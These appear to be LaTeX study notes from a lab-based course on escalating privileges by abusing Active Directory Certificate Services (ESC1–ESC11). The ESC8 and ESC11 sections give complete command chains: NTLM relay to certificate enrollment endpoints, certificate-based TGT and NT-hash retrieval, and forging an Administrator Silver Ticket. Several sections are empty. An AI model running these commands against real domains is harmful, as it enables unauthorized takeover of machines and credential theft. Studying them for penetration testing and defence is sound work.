\section{Escalation attacks}

\subsection{ESC1: Misconfigured Certificate Templates}
certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN)


\subsection{ESC2: Misconfigured Certificate Templates}
 certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates.

\subsection{ESC3: Misconfigured Enrollment Agent Templates}
certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

\subsection{ESC4: Vulnerable Certificate Template Access Control}
user has write privileges over a certificate template

\subsection{ESC5: Vulnerable PKI Object Access Control}

\subsection{ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2}
CA specifies the \verb+EDITF_ATTRIBUTESUBJECTALTNAME2+ flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration.
\subsection{ESC7: Vulnerable Certificate Authority Access Control}

\subsection{ESC8: NTLM Relay to AD CS HTTP Endpoints}

"If an environment has AD CS installed, along with a vulnerable web enrollment endpoint and at least one certificate template published that allows for domain computer enrollment and client authentication (like the default Machine/Computer template), then an attacker can compromise ANY computer with the spooler service running!".

The idea behind the ESC8 attack is to coerce authentication from a machine account and relay it to AD CS to obtain a certificate that allows for client authentication; afterward, we abuse the certificate to forge a Silver Ticket. Therefore, if the AD CS is vulnerable to ESC8, we can compromise any computer in the domain from which we can coerce authentication.

\subsubsection{ntlmrelayx}
\begin{verbatim}
sudo ntlmrelayx.py -t http://172.16.117.3/certsrv/certfnsh.asp \
    -smb2support --adcs --template Machine
\end{verbatim}

then launch a coerce attack.


decode the certificate
\begin{verbatim}
 echo -n "MIIRPQI<SNIP>U6EWbi/ttH4BAjUKtJ9ygRfRg==" | base64 -d > ws01.pfx
\end{verbatim}

get the computer TGT and and AS-REP Encryption Key
\begin{verbatim}
python3 gettgtpkinit.py -dc-ip 172.16.117.3 -cert-pfx ws01.pfx 'INLANEFREIGHT.LOCAL/WS01$' ws01.ccache
\end{verbatim}

Retrieve the NT Hash of \verb+WS01$+ using getnthash.py:
\begin{verbatim}
export KRB5CCNAME=ws01.ccache 
python3 getnthash.py 'INLANEFREIGHT.LOCAL/WS01$' -key  917...SNIP...ba644ebb2
\end{verbatim}

Obtain the Domain SID with lookupsid.py
\begin{verbatim}
lookupsid.py 'INLANEFREIGHT.LOCAL/WS01$'@172.16.117.3 -hashes :3d...SNIP...76460
\end{verbatim}

Use ticketer.py to Forge a Silver Ticket as Administrator
\begin{verbatim}
jticketer.py -nthash 3d3a72af94548ebc7755287a88476460 \
    -domain-sid S-1-5-21-1207890233-375443991-2397730614 \
    -domain inlanefreight.local \
    -spn cifs/ws01.inlanefreight.local \
    Administrator
\end{verbatim}

\subsubsection{certipy}

Performing the same attack with Certipy saves us a few steps compared to ntlmrelayx

\begin{verbatim}
sudo certipy relay -target "http://172.16.117.3" -template Machine
\end{verbatim}

then coerce
\begin{verbatim}
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
\end{verbatim}

From here, we can continue the attack chain and forge a silver ticket with ticketer.py.


\subsection{ESC9: }
\subsection{ESC10: }
\subsection{ESC11: NTLM Relay to AD CS ICRP Endpoints}

ICertPassage Remote Protocol (MS-ICRP/ICRP), a subset of Windows Client Certificate Enrollment Protocol (MS-WCCE), exposes an RPC interface that allows clients to interact with a CA to request and receive x.509 certificates. ICPR's sole purpose is to provide clients with the certificate enrollment functionality.  3.2.4.1.1 CertServerRequest (Opnum 0) is the only method the ICertPassage Interface defines, which is responsible for processing certificate enrollment requests from clients. In the method's specification, we will notice that it states that for the CA to establish a connection with a client, the flag \verb+IF_ENFORCEENCRYPTICERTREQUEST+ must be set.

From the output of Certipy, we know that the CA suffers from ESC11.

 to abuse ESC11, we will use Certipy, which does support ICRP. Similar to ESC8, we will use the relay command; however, this time, we will relay the coerced SMB NTLM authentication over RPC/ICRP instead of HTTP; additionally, we must specify the CA name, which, as shown in Certipy's find command output, is INLANEFREIGHT-DC01-CA:

\begin{verbatim}
certipy relay -target "rpc://172.16.117.3" -ca "INLANEFREIGHT-DC01-CA"
\end{verbatim}

Then coerce

From here on, we can continue similar to the ESC8 attack chain and use the auth command of Certipy to obtain the NT (and LM) hash of WS01.
